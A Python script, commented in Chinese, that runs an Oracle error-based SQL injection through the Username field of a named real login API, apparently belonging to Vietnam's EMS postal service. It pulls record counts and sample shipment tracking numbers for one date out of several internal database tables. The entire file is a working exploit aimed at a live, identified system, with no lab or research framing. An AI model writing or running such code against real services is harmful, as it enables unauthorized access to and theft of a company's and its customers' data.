#!/usr/bin/env python3
"""
检查2025-10-11的EMS运单号
"""

import requests
import json
import time

class Oct11Checker:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def check_oct_11(self):
        """检查10月11日数据"""
        print("=" * 80)
        print("📊 统计：2025-10-11的EMS运单号")
        print("=" * 80)
        
        date = '20251011'
        
        # 检查各表
        queries = [
            ("SHIPMENT表", "EMS.SHIPMENT", "CREATE_DATE"),
            ("E1E2_PH表", "EMS.E1E2_PH", "NGAY"),
            ("JOURNEYTOKEN表", "EMS.JOURNEYTOKEN_ZNS", "TOKENDATE"),
            ("TEMP_LOG表", "EMS.E1E2_PH_TEMP_DATA2_LOG", "NGAY"),
        ]
        
        for name, table, date_field in queries:
            print(f"\n{'='*80}")
            print(f"{name}（{date_field}={date}）")
            print(f"{'='*80}")
            
            # 总记录数
            query1 = f"SELECT COUNT(*) FROM {table} WHERE {date_field}='{date}'"
            result1 = self.extract_via_error(query1)
            if result1:
                print(f"  总记录数: {result1}")
            
            time.sleep(1)
            
            # 如果是JOURNEYTOKEN，统计EMS格式
            if 'JOURNEYTOKEN' in table:
                query2 = f"SELECT COUNT(DISTINCT ITEMCODE) FROM {table} WHERE {date_field}='{date}'"
                result2 = self.extract_via_error(query2)
                if result2:
                    print(f"  独立运单号: {result2}")
                
                time.sleep(1)
                
                query3 = f"SELECT COUNT(DISTINCT ITEMCODE) FROM {table} WHERE {date_field}='{date}' AND ITEMCODE LIKE 'E%VN'"
                result3 = self.extract_via_error(query3)
                if result3:
                    print(f"  EMS格式(E*VN): {result3} ⭐")
                
                time.sleep(1)
        
        # 提取样本
        print(f"\n{'='*80}")
        print("📦 样本运单号（10月11日前10个）")
        print(f"{'='*80}")
        
        for i in range(1, 11):
            query = f"SELECT DISTINCT ITEMCODE FROM (SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%' ORDER BY ITEMCODE) WHERE ROWNUM={i}"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                print(f"{i}. {result}")
            
            time.sleep(0.3)
    
    def run(self):
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接")
            return
        print(f"✅ 连接成功\n")
        
        self.check_oct_11()
        
        print("\n" + "=" * 80)
        print("✅ 检查完成")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    checker = Oct11Checker(target_url)
    checker.run()
